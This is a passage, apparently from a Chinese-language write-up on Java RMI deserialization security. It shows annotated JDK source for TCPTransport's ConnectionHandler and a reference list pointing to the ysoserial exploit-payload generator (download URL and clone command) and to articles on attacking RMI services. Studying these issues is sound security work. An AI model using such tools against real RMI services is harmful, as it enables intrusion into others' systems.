+--------------------------------------------------------------------------
+/*
+ * sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.<init>
+ *
+ * 642行
+ */
+ConnectionHandler(Socket socket, String remoteHost) {
+    this.socket = socket;
+/*
+ * 保存clientHost
+ */
+    this.remoteHost = remoteHost;
+}
+--------------------------------------------------------------------------
+/*
+ * sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.getClientHost
+ *
+ * 648行
+ */
+String getClientHost() {
+/*
+ * 获取clientHost
+ */
+    return remoteHost;
+}
+--------------------------------------------------------------------------
+
+☆ 参考资源
+
+[52]
+    ysoserial
+    https://github.com/frohoff/ysoserial/
+    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
+    (A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization)
+    (可以自己编译，不需要下这个jar包)
+
+    git clone https://github.com/frohoff/ysoserial.git
+
+[65]
+    一次攻击内网rmi服务的深思 - bsmali4 [2018-09-20]
+    http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/
+
+[66]
+    浅谈Java RMI Registry反序列化安全问题 - [2020-02-06]
+    http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/
